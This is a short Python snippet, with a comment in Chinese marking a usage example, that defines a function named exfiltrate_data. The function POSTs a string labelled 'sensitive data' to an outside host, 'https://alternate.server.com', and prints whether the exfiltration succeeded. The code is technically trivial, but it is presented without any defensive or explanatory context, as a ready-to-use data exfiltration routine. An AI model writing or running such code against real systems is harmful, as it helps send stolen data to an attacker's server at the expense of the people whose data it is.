import requests

def exfiltrate_data(url, data):
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print("Data exfiltrated successfully.")
    else:
        print("Failed to exfiltrate data.")

# 使用範例
url = "https://alternate.server.com"
data = "sensitive data"
exfiltrate_data(url, data)